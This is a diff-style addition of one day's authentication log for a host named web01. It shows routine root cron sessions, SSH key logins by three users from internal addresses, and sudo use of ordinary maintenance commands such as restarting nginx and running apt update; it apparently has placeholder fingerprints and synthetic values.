+Oct 16 06:10:29 web01 CRON[49055]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 06:10:30 web01 CRON[24119]: pam_unix(cron:session): session closed for user root
+Oct 16 06:20:35 web01 CRON[4734]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 06:20:36 web01 CRON[62691]: pam_unix(cron:session): session closed for user root
+Oct 16 06:30:27 web01 CRON[43797]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 06:30:28 web01 CRON[57997]: pam_unix(cron:session): session closed for user root
+Oct 16 06:40:57 web01 CRON[4704]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 06:40:58 web01 CRON[52023]: pam_unix(cron:session): session closed for user root
+Oct 16 06:50:08 web01 CRON[52238]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 06:50:09 web01 CRON[16264]: pam_unix(cron:session): session closed for user root
+Oct 16 07:00:45 web01 CRON[4070]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 07:00:46 web01 CRON[31606]: pam_unix(cron:session): session closed for user root
+Oct 16 07:10:40 web01 CRON[22054]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 07:10:41 web01 CRON[4987]: pam_unix(cron:session): session closed for user root
+Oct 16 07:20:48 web01 CRON[38017]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 07:20:49 web01 CRON[9185]: pam_unix(cron:session): session closed for user root
+Oct 16 07:30:25 web01 CRON[55334]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 07:30:26 web01 CRON[9775]: pam_unix(cron:session): session closed for user root
+Oct 16 07:40:42 web01 CRON[52076]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 07:40:43 web01 CRON[42994]: pam_unix(cron:session): session closed for user root
+Oct 16 07:50:58 web01 CRON[14464]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 07:50:59 web01 CRON[57407]: pam_unix(cron:session): session closed for user root
+Oct 16 08:00:51 web01 CRON[52936]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 08:00:52 web01 CRON[16215]: pam_unix(cron:session): session closed for user root
+Oct 16 08:10:00 web01 CRON[2607]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 08:10:01 web01 CRON[34891]: pam_unix(cron:session): session closed for user root
+Oct 16 08:20:32 web01 CRON[4161]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 08:20:33 web01 CRON[33287]: pam_unix(cron:session): session closed for user root
+Oct 16 08:30:39 web01 CRON[34027]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 08:30:40 web01 CRON[46664]: pam_unix(cron:session): session closed for user root
+Oct 16 08:40:41 web01 CRON[58739]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 08:40:42 web01 CRON[1565]: pam_unix(cron:session): session closed for user root
+Oct 16 08:50:27 web01 CRON[14235]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 08:50:28 web01 CRON[61273]: pam_unix(cron:session): session closed for user root
+Oct 16 09:00:05 web01 CRON[23509]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 09:00:06 web01 CRON[30252]: pam_unix(cron:session): session closed for user root
+Oct 16 09:06:02 web01 sshd[39893]: Accepted publickey for alice from 10.0.0.27 port 43133 ssh2: ED25519 SHA256:x
+Oct 16 09:06:03 web01 systemd-logind[46216]: New session 7250 of user alice.
+Oct 16 09:10:03 web01 CRON[8945]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 09:10:04 web01 CRON[27248]: pam_unix(cron:session): session closed for user root
+Oct 16 09:18:20 web01 sshd[43441]: Accepted publickey for carol from 10.0.0.40 port 34459 ssh2: ED25519 SHA256:x
+Oct 16 09:18:21 web01 systemd-logind[36376]: New session 6164 of user carol.
+Oct 16 09:20:20 web01 sudo: carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Oct 16 09:20:52 web01 CRON[59227]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 09:20:53 web01 CRON[11130]: pam_unix(cron:session): session closed for user root
+Oct 16 09:28:38 web01 sshd[40073]: Accepted publickey for bob from 10.0.0.28 port 42456 ssh2: ED25519 SHA256:x
+Oct 16 09:28:39 web01 systemd-logind[47507]: New session 6149 of user bob.
+Oct 16 09:30:21 web01 CRON[13156]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 09:30:22 web01 CRON[59533]: pam_unix(cron:session): session closed for user root
+Oct 16 09:36:02 web01 sshd[4039]: Received disconnect from 10.0.0.27 port 34922:11: disconnected by user
+Oct 16 09:40:15 web01 CRON[21485]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 09:40:16 web01 CRON[40249]: pam_unix(cron:session): session closed for user root
+Oct 16 09:48:20 web01 sshd[9011]: Received disconnect from 10.0.0.40 port 52293:11: disconnected by user
+Oct 16 09:49:04 web01 sshd[23233]: Accepted publickey for carol from 10.0.0.24 port 36324 ssh2: ED25519 SHA256:x
+Oct 16 09:49:05 web01 systemd-logind[39974]: New session 2816 of user carol.
+Oct 16 09:50:10 web01 CRON[50901]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 09:50:11 web01 CRON[34436]: pam_unix(cron:session): session closed for user root
+Oct 16 09:51:04 web01 sudo: carol : TTY=pts/2 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 16 09:58:38 web01 sshd[5688]: Received disconnect from 10.0.0.28 port 34223:11: disconnected by user
+Oct 16 10:00:21 web01 CRON[43270]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 10:00:22 web01 CRON[54454]: pam_unix(cron:session): session closed for user root
+Oct 16 10:02:40 web01 sshd[40658]: Accepted publickey for carol from 10.0.0.16 port 34129 ssh2: ED25519 SHA256:x
+Oct 16 10:02:41 web01 systemd-logind[23017]: New session 3439 of user carol.
+Oct 16 10:04:40 web01 sudo: carol : TTY=pts/0 ; PWD=/home/carol ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 16 10:10:53 web01 CRON[53564]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 10:10:54 web01 CRON[19901]: pam_unix(cron:session): session closed for user root
+Oct 16 10:19:04 web01 sshd[37881]: Received disconnect from 10.0.0.24 port 40745:11: disconnected by user
+Oct 16 10:20:34 web01 CRON[22183]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 10:20:35 web01 CRON[21579]: pam_unix(cron:session): session closed for user root
+Oct 16 10:30:27 web01 CRON[28490]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 10:30:28 web01 CRON[36158]: pam_unix(cron:session): session closed for user root
+Oct 16 10:32:40 web01 sshd[45853]: Received disconnect from 10.0.0.16 port 53578:11: disconnected by user
+Oct 16 10:40:37 web01 CRON[8663]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 10:40:38 web01 CRON[41106]: pam_unix(cron:session): session closed for user root
+Oct 16 10:50:57 web01 CRON[61149]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 10:50:58 web01 CRON[18305]: pam_unix(cron:session): session closed for user root
+Oct 16 10:59:04 web01 sshd[40864]: Accepted publickey for alice from 10.0.0.16 port 46872 ssh2: ED25519 SHA256:x
+Oct 16 10:59:05 web01 systemd-logind[60450]: New session 9638 of user alice.
+Oct 16 11:00:00 web01 CRON[29122]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 11:00:01 web01 CRON[57768]: pam_unix(cron:session): session closed for user root
+Oct 16 11:01:04 web01 sudo: alice : TTY=pts/3 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/docker ps
+Oct 16 11:10:48 web01 CRON[31255]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 11:10:49 web01 CRON[10273]: pam_unix(cron:session): session closed for user root
+Oct 16 11:20:41 web01 CRON[49429]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 11:20:42 web01 CRON[34143]: pam_unix(cron:session): session closed for user root
+Oct 16 11:29:04 web01 sshd[35659]: Received disconnect from 10.0.0.16 port 37047:11: disconnected by user
+Oct 16 11:30:40 web01 CRON[22768]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 11:30:41 web01 CRON[23074]: pam_unix(cron:session): session closed for user root
+Oct 16 11:40:38 web01 CRON[45039]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 11:40:39 web01 CRON[26302]: pam_unix(cron:session): session closed for user root
+Oct 16 11:50:46 web01 CRON[51167]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 11:50:47 web01 CRON[36572]: pam_unix(cron:session): session closed for user root
+Oct 16 12:00:36 web01 CRON[19978]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 12:00:37 web01 CRON[62876]: pam_unix(cron:session): session closed for user root
+Oct 16 12:10:39 web01 CRON[25113]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 12:10:40 web01 CRON[61417]: pam_unix(cron:session): session closed for user root
+Oct 16 12:20:52 web01 CRON[33769]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 12:20:53 web01 CRON[3457]: pam_unix(cron:session): session closed for user root
+Oct 16 12:30:20 web01 CRON[1436]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 12:30:21 web01 CRON[4184]: pam_unix(cron:session): session closed for user root
+Oct 16 12:40:13 web01 CRON[41685]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 12:40:14 web01 CRON[36339]: pam_unix(cron:session): session closed for user root
+Oct 16 12:50:16 web01 CRON[50963]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 12:50:17 web01 CRON[55121]: pam_unix(cron:session): session closed for user root
+Oct 16 13:00:35 web01 CRON[2849]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 13:00:36 web01 CRON[45730]: pam_unix(cron:session): session closed for user root
+Oct 16 13:10:08 web01 CRON[21827]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 13:10:09 web01 CRON[10939]: pam_unix(cron:session): session closed for user root
+Oct 16 13:20:32 web01 CRON[56048]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 13:20:33 web01 CRON[21572]: pam_unix(cron:session): session closed for user root
+Oct 16 13:30:52 web01 CRON[17860]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 13:30:53 web01 CRON[39439]: pam_unix(cron:session): session closed for user root
+Oct 16 13:40:15 web01 CRON[54907]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 13:40:16 web01 CRON[5681]: pam_unix(cron:session): session closed for user root
+Oct 16 13:43:08 web01 sshd[36394]: Failed password for bob from 10.0.0.38 port 41869 ssh2
+Oct 16 13:43:13 web01 sshd[39102]: Accepted publickey for bob from 10.0.0.38 port 36173 ssh2: ED25519 SHA256:x
+Oct 16 13:43:14 web01 systemd-logind[57018]: New session 3035 of user bob.
+Oct 16 13:50:11 web01 CRON[61946]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 13:50:12 web01 CRON[8251]: pam_unix(cron:session): session closed for user root
+Oct 16 14:00:00 web01 CRON[10504]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 14:00:01 web01 CRON[20127]: pam_unix(cron:session): session closed for user root
+Oct 16 14:10:16 web01 CRON[30086]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 14:10:17 web01 CRON[45811]: pam_unix(cron:session): session closed for user root
+Oct 16 14:13:13 web01 sshd[12566]: Received disconnect from 10.0.0.38 port 57838:11: disconnected by user
+Oct 16 14:20:47 web01 CRON[19453]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 14:20:48 web01 CRON[39958]: pam_unix(cron:session): session closed for user root
+Oct 16 14:30:08 web01 CRON[43478]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 14:30:09 web01 CRON[64223]: pam_unix(cron:session): session closed for user root
+Oct 16 14:40:26 web01 CRON[29041]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 14:40:27 web01 CRON[37294]: pam_unix(cron:session): session closed for user root
+Oct 16 14:43:49 web01 sshd[4866]: Accepted publickey for bob from 10.0.0.36 port 36736 ssh2: ED25519 SHA256:x
+Oct 16 14:43:50 web01 systemd-logind[42991]: New session 7465 of user bob.
+Oct 16 14:50:33 web01 CRON[50463]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 14:50:34 web01 CRON[32915]: pam_unix(cron:session): session closed for user root
+Oct 16 15:00:39 web01 CRON[30037]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 15:00:40 web01 CRON[1202]: pam_unix(cron:session): session closed for user root
+Oct 16 15:10:16 web01 CRON[10338]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 15:10:17 web01 CRON[21467]: pam_unix(cron:session): session closed for user root
+Oct 16 15:13:49 web01 sshd[9695]: Received disconnect from 10.0.0.36 port 36987:11: disconnected by user
+Oct 16 15:20:06 web01 CRON[1150]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 15:20:07 web01 CRON[32549]: pam_unix(cron:session): session closed for user root
+Oct 16 15:30:00 web01 CRON[4147]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 15:30:01 web01 CRON[29916]: pam_unix(cron:session): session closed for user root
+Oct 16 15:40:04 web01 CRON[32104]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 15:40:05 web01 CRON[31527]: pam_unix(cron:session): session closed for user root
+Oct 16 15:50:43 web01 CRON[27887]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 15:50:44 web01 CRON[23803]: pam_unix(cron:session): session closed for user root
+Oct 16 16:00:45 web01 CRON[37916]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 16:00:46 web01 CRON[30538]: pam_unix(cron:session): session closed for user root
+Oct 16 16:05:34 web01 sshd[2972]: Failed password for alice from 10.0.0.12 port 48950 ssh2
+Oct 16 16:05:39 web01 sshd[50969]: Accepted publickey for alice from 10.0.0.12 port 32990 ssh2: ED25519 SHA256:x
+Oct 16 16:05:40 web01 systemd-logind[12104]: New session 1814 of user alice.
+Oct 16 16:10:47 web01 CRON[6520]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 16:10:48 web01 CRON[32186]: pam_unix(cron:session): session closed for user root
+Oct 16 16:20:58 web01 CRON[58940]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 16:20:59 web01 CRON[8680]: pam_unix(cron:session): session closed for user root
+Oct 16 16:28:39 web01 sshd[21484]: Accepted publickey for alice from 10.0.0.34 port 50701 ssh2: ED25519 SHA256:x
+Oct 16 16:28:40 web01 systemd-logind[36866]: New session 8348 of user alice.
+Oct 16 16:30:23 web01 CRON[28531]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 16:30:24 web01 CRON[38359]: pam_unix(cron:session): session closed for user root
+Oct 16 16:35:39 web01 sshd[21571]: Received disconnect from 10.0.0.12 port 36713:11: disconnected by user
+Oct 16 16:40:39 web01 sshd[37770]: Accepted publickey for bob from 10.0.0.10 port 37217 ssh2: ED25519 SHA256:x
+Oct 16 16:40:40 web01 systemd-logind[64445]: New session 6021 of user bob.
+Oct 16 16:40:46 web01 CRON[30495]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 16:40:47 web01 CRON[56819]: pam_unix(cron:session): session closed for user root
+Oct 16 16:42:39 web01 sudo: bob : TTY=pts/2 ; PWD=/home/bob ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx
+Oct 16 16:43:43 web01 sshd[12870]: Accepted publickey for alice from 10.0.0.25 port 54106 ssh2: ED25519 SHA256:x
+Oct 16 16:43:44 web01 systemd-logind[53851]: New session 7007 of user alice.
+Oct 16 16:45:43 web01 sudo: alice : TTY=pts/4 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 16 16:50:24 web01 CRON[22064]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 16:50:25 web01 CRON[42787]: pam_unix(cron:session): session closed for user root
+Oct 16 16:58:39 web01 sshd[16709]: Received disconnect from 10.0.0.34 port 50126:11: disconnected by user
+Oct 16 17:00:33 web01 CRON[44041]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 17:00:34 web01 CRON[10130]: pam_unix(cron:session): session closed for user root
+Oct 16 17:10:14 web01 CRON[44992]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 17:10:15 web01 CRON[63219]: pam_unix(cron:session): session closed for user root
+Oct 16 17:10:39 web01 sshd[19058]: Received disconnect from 10.0.0.10 port 34510:11: disconnected by user
+Oct 16 17:13:43 web01 sshd[47454]: Received disconnect from 10.0.0.25 port 51195:11: disconnected by user
+Oct 16 17:20:40 web01 CRON[64899]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 17:20:41 web01 CRON[11308]: pam_unix(cron:session): session closed for user root
+Oct 16 17:30:45 web01 CRON[26307]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 17:30:46 web01 CRON[39908]: pam_unix(cron:session): session closed for user root
+Oct 16 17:40:00 web01 CRON[4670]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 17:40:01 web01 CRON[52332]: pam_unix(cron:session): session closed for user root
+Oct 16 17:50:06 web01 CRON[28663]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 17:50:07 web01 CRON[54873]: pam_unix(cron:session): session closed for user root
+Oct 16 18:00:24 web01 CRON[44081]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 18:00:25 web01 CRON[33213]: pam_unix(cron:session): session closed for user root
+Oct 16 18:10:55 web01 CRON[38701]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 18:10:56 web01 CRON[43322]: pam_unix(cron:session): session closed for user root
+Oct 16 18:20:27 web01 CRON[10527]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 18:20:28 web01 CRON[44222]: pam_unix(cron:session): session closed for user root
+Oct 16 18:30:47 web01 CRON[23492]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 18:30:48 web01 CRON[10869]: pam_unix(cron:session): session closed for user root
+Oct 16 18:40:06 web01 CRON[26302]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 18:40:07 web01 CRON[34966]: pam_unix(cron:session): session closed for user root
+Oct 16 18:50:21 web01 CRON[37426]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 18:50:22 web01 CRON[60255]: pam_unix(cron:session): session closed for user root
+Oct 16 19:00:17 web01 CRON[59934]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 19:00:18 web01 CRON[30547]: pam_unix(cron:session): session closed for user root
+Oct 16 19:10:09 web01 CRON[28084]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 19:10:10 web01 CRON[45359]: pam_unix(cron:session): session closed for user root
+Oct 16 19:20:00 web01 CRON[61246]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 19:20:01 web01 CRON[49788]: pam_unix(cron:session): session closed for user root
+Oct 16 19:30:06 web01 CRON[52633]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 19:30:07 web01 CRON[47225]: pam_unix(cron:session): session closed for user root
+Oct 16 19:40:37 web01 CRON[11736]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 19:40:38 web01 CRON[64834]: pam_unix(cron:session): session closed for user root
+Oct 16 19:50:23 web01 CRON[37996]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 19:50:24 web01 CRON[43826]: pam_unix(cron:session): session closed for user root
+Oct 16 20:00:55 web01 CRON[2120]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 20:00:56 web01 CRON[56295]: pam_unix(cron:session): session closed for user root
+Oct 16 20:10:59 web01 CRON[39343]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 20:11:00 web01 CRON[26737]: pam_unix(cron:session): session closed for user root
+Oct 16 20:20:39 web01 CRON[5619]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 20:20:40 web01 CRON[6462]: pam_unix(cron:session): session closed for user root
+Oct 16 20:30:45 web01 CRON[34356]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 20:30:46 web01 CRON[16704]: pam_unix(cron:session): session closed for user root
+Oct 16 20:40:07 web01 CRON[56766]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 20:40:08 web01 CRON[31563]: pam_unix(cron:session): session closed for user root
+Oct 16 20:50:36 web01 CRON[26776]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 20:50:37 web01 CRON[33353]: pam_unix(cron:session): session closed for user root
+Oct 16 21:00:55 web01 CRON[27964]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 21:00:56 web01 CRON[12511]: pam_unix(cron:session): session closed for user root
+Oct 16 21:10:53 web01 CRON[13515]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 21:10:54 web01 CRON[9657]: pam_unix(cron:session): session closed for user root
+Oct 16 21:20:04 web01 CRON[50847]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 21:20:05 web01 CRON[62346]: pam_unix(cron:session): session closed for user root
+Oct 16 21:30:15 web01 CRON[3525]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 21:30:16 web01 CRON[28998]: pam_unix(cron:session): session closed for user root
+Oct 16 21:40:39 web01 CRON[51098]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 21:40:40 web01 CRON[27436]: pam_unix(cron:session): session closed for user root
+Oct 16 21:50:04 web01 CRON[16319]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 21:50:05 web01 CRON[41983]: pam_unix(cron:session): session closed for user root
+Oct 16 22:00:49 web01 CRON[37431]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 22:00:50 web01 CRON[33631]: pam_unix(cron:session): session closed for user root
+Oct 16 22:10:11 web01 CRON[62670]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 22:10:12 web01 CRON[20468]: pam_unix(cron:session): session closed for user root
+Oct 16 22:20:17 web01 CRON[6211]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 22:20:18 web01 CRON[1648]: pam_unix(cron:session): session closed for user root
+Oct 16 22:30:20 web01 CRON[6622]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 22:30:21 web01 CRON[5577]: pam_unix(cron:session): session closed for user root
+Oct 16 22:40:08 web01 CRON[21147]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 22:40:09 web01 CRON[50697]: pam_unix(cron:session): session closed for user root
+Oct 16 22:50:50 web01 CRON[64249]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 22:50:51 web01 CRON[9584]: pam_unix(cron:session): session closed for user root
+Oct 16 23:00:39 web01 CRON[20333]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 23:00:40 web01 CRON[11597]: pam_unix(cron:session): session closed for user root
+Oct 16 23:10:03 web01 CRON[5781]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 23:10:04 web01 CRON[28393]: pam_unix(cron:session): session closed for user root
+Oct 16 23:20:58 web01 CRON[59277]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 23:20:59 web01 CRON[50503]: pam_unix(cron:session): session closed for user root
+Oct 16 23:30:44 web01 CRON[52133]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 23:30:45 web01 CRON[1650]: pam_unix(cron:session): session closed for user root
+Oct 16 23:40:03 web01 CRON[46151]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 23:40:04 web01 CRON[8617]: pam_unix(cron:session): session closed for user root
+Oct 16 23:50:29 web01 CRON[46617]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 16 23:50:30 web01 CRON[51294]: pam_unix(cron:session): session closed for user root
